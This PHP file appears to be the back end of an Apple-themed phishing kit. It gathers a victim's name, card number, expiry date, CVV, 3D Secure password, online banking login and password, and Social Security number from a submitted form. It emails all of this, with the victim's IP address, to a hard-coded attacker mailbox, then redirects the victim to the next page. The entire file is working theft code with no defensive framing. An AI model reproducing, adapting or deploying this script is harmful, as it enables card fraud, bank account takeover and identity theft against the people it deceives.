<?
$ip = getenv("REMOTE_ADDR");
$bilsmg .= "---- |   Apple CC   | ----\n";
$bilsmg .= "---- |              | ----\n";

$bilsmg .= "Full Name  : ".$_POST['fullname']."\n";
$bilsmg .= " Card Type : ".$_POST['ctpe']."\n";
$bilsmg .= "Card Number  : ".$_POST['ccnumber0']."\n";
$bilsmg .= "Expiration date : ".$_POST['exp_mm']."/".$_POST['exp_yy']."\n";
$bilsmg .= "Security Code  : ".$_POST['cvv0']."\n";
$bilsmg .= "3D secure password  : ".$_POST['password']."\n";
$bilsmg .= "Name Your Bank  : ".$_POST['banknam']."\n";
$bilsmg .= "Online ID Bank  : ".$_POST['idbank']."\n";
$bilsmg .= "Password Bank  : ".$_POST['pssbank']."\n";
$bilsmg .= "Social Security Number : ".$_POST['ssn1']."/".$_POST['ssn2']."/".$_POST['ssn3']."\n";
$bilsmg .= "----- |                           | ------\n";


$bilsmg .= "Fr0m $ip             chek in http://www.geoiptool.com/?IP=$ip   \n";



$bilsnd = "zira.vbv@hotmail.fr";
$bilsub = "Apple CC Fr0m $ip";
$bilhead = "From:Apple rezults ";
$bilhead .= $_POST['eMailAdd']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

header("Location: Personal.html");
?>